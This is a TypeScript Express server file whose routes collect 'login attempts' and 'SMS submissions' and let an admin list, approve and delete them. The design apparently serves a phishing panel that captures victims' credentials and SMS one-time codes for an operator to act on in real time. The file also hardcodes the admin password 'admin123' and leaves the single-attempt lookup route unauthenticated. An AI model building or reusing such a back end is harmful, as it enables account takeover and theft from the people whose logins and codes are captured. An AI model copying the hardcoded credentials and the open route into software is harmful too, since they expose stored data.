import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertLoginAttemptSchema, insertSmsSubmissionSchema } from "@shared/schema";

// Admin authentication middleware
const adminAuth = (req: any, res: any, next: any) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.status(401).json({ error: 'Authentication required' });
    return;
  }
  
  const credentials = Buffer.from(authHeader.split(' ')[1], 'base64').toString('utf-8');
  const [username, password] = credentials.split(':');
  
  // Простая проверка логина и пароля
  if (username === 'admin' && password === 'admin123') {
    next();
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
};

export async function registerRoutes(app: Express): Promise<Server> {
  // Create login attempt
  app.post("/api/login-attempts", async (req, res) => {
    try {
      const validatedData = insertLoginAttemptSchema.parse(req.body);
      const loginAttempt = await storage.createLoginAttempt(validatedData);
      res.json(loginAttempt);
    } catch (error) {
      res.status(400).json({ error: "Invalid data" });
    }
  });

  // Get all login attempts (protected)
  app.get("/api/login-attempts", adminAuth, async (req, res) => {
    try {
      const attempts = await storage.getLoginAttempts();
      res.json(attempts);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch login attempts" });
    }
  });

  // Approve login attempt (protected)
  app.post("/api/login-attempts/:id/approve", adminAuth, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      await storage.approveLoginAttempt(id);
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to approve login attempt" });
    }
  });

  // Get single login attempt
  app.get("/api/login-attempts/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const attempt = await storage.getLoginAttempt(id);
      if (!attempt) {
        return res.status(404).json({ error: "Login attempt not found" });
      }
      res.json(attempt);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch login attempt" });
    }
  });

  // Create SMS submission
  app.post("/api/sms-submissions", async (req, res) => {
    try {
      const validatedData = insertSmsSubmissionSchema.parse(req.body);
      const smsSubmission = await storage.createSmsSubmission(validatedData);
      res.json(smsSubmission);
    } catch (error) {
      res.status(400).json({ error: "Invalid data" });
    }
  });

  // Get all SMS submissions (protected)
  app.get("/api/sms-submissions", adminAuth, async (req, res) => {
    try {
      const submissions = await storage.getSmsSubmissions();
      res.json(submissions);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch SMS submissions" });
    }
  });

  // Delete login attempt (protected)
  app.delete("/api/login-attempts/:id", adminAuth, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      await storage.deleteLoginAttempt(id);
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete login attempt" });
    }
  });

  // Delete SMS submission (protected)
  app.delete("/api/sms-submissions/:id", adminAuth, async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      await storage.deleteSmsSubmission(id);
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete SMS submission" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
